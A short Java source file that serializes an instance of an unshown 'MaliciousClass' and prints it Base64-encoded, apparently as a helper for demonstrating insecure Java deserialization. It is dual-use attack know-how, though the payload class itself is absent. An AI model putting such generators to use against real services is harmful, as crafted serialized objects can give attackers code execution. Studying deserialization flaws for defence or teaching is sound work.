package javabase;

import java.io.*;
import java.util.Base64;

public class MaliciousObjectCreator {
    public static void main(String[] args) {
        MaliciousClass malicious = new MaliciousClass();
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(malicious);
            oos.flush();
            String serializedObject = Base64.getEncoder().encodeToString(bos.toByteArray());
            System.out.println("Serialized malicious object: " + serializedObject);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

